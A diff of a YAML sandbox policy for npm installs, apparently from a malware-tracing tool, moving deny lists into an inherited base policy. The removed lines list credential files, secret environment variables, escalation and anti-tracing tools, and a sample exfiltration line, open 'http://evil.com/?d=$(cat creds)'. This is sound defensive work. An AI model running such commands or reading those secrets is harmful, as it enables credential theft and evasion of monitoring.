@@ -1,7 +1,11 @@
 version: 1
+includes: [base]
 
 # Auto-policy for npm install / add / ci
 # Customise: ~/.config/malwi/policies/npm-install.yaml
+#
+# Inherits from base: files, envvars, symbols, network deny/warn.
+# Only policy-specific overrides below.
 
 nodejs:
   allow:
@@ -40,109 +44,9 @@ commands:
     - "python*"
     - perl
     - ruby
-    # Scripting interpreters — arbitrary code execution bypassing traced process
-    - osascript    # AppleScript/JXA: shell, file, network via scripting bridge
-    - swift
-    - java
-    # Data exfiltration
-    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat creds)"
-    - sqlite3      # queries browser credential DBs (Chrome Login Data, etc.)
-    # Anti-tracing — can terminate the malwi agent/CLI
-    - kill
-    - pkill
-    - killall
-    # Linux scripting interpreters — arbitrary code bypassing traced process
-    - gjs          # GNOME JavaScript: D-Bus, file, network access
-    - dbus-send    # D-Bus: invoke polkit, systemd, NetworkManager
-    - gdbus        # GLib D-Bus tool
-    - busctl       # systemd D-Bus introspection/invocation
-    # Linux data exfiltration
-    - xdg-open     # opens URLs in browser bypassing network hooks
-    # Linux credential readers
-    - secret-tool  # GNOME Keyring CLI
-    # Process memory/injection — dump credentials via ptrace
-    - strace       # trace syscalls of other processes
-    - gdb          # attach to process, inject code, dump memory
-    # Linux privilege escalation
-    - pkexec       # PolicyKit: pkexec bash (CVE-2021-4034)
-    # Linux security bypass — catastrophic impact
-    - setenforce   # disable SELinux
-    - aa-disable   # disable AppArmor
-    - debugfs      # raw filesystem access, bypasses ALL permissions
-    - nsenter      # container escape via namespace entry
-    # Kernel manipulation — rootkit installation
-    - insmod       # load kernel module
-    - modprobe     # load kernel module by name
-    - rmmod        # remove kernel module (disable security)
-    - kexec        # load new kernel, bypass all controls
-    - setcap       # set file capabilities (grant root-like powers)
 
+# npm registry only — other domains blocked by default (base denies metadata + .onion)
 network:
   allow:
     - "registry.npmjs.org/**"
     - "*.npmjs.org/**"
-  deny:
-    - "169.254.169.254/**"
-    - "metadata.google.internal/**"
-  warn:
-    - "*.onion"
-    - "*.i2p"
-    - "*.bit"
-    - "*.loki"
-
-# Protect sensitive files from exfiltration.
-files:
-  deny:
-    - "~/.ssh/**"
-    - "*/.ssh/**"
-    - "~/.aws/**"
-    - "*/.aws/**"
-    - "~/.config/gcloud/**"
-    - "~/.azure/**"
-    - "~/.gnupg/**"
-    - "~/.config/gh/**"
-    - "*/.kube/config"
-    - "*.pem"
-    - "*.key"
-    - "*id_rsa*"
-    - "*id_ed25519*"
-    # Linux credential stores
-    - "~/.local/share/keyrings/**"     # GNOME Keyring files
-    - "~/.local/share/kwalletd/**"     # KDE Wallet files
-    # System-level preload (rootkit vector)
-    - "/etc/ld.so.preload"             # system-wide LD_PRELOAD
-
-# Protect sensitive environment variables.
-envvars:
-  deny:
-    - "*SECRET*"
-    - "*TOKEN*"
-    - "*PASSWORD*"
-    - "*API_KEY*"
-    - "*PRIVATE_KEY*"
-    - "AWS_*"
-    - "GITHUB_*"
-    - "GCP_*"
-    - "AZURE_*"
-    - "OPENAI_*"
-    - "ANTHROPIC_*"
-    - HF_TOKEN
-    - DYLD_INSERT_LIBRARIES
-    - LD_PRELOAD
-
-# Block credential-interception, filesystem bypass, and raw networking functions.
-symbols:
-  deny:
-    # Credential interception
-    - getpass
-    - crypt
-    # Symlink/hardlink creation (bypass file path patterns)
-    - symlink
-    - link
-    # Direct syscall wrapper
-    - syscall
-    # Raw networking
-    - connect
-    - socket
-    - sendto
-    - bind
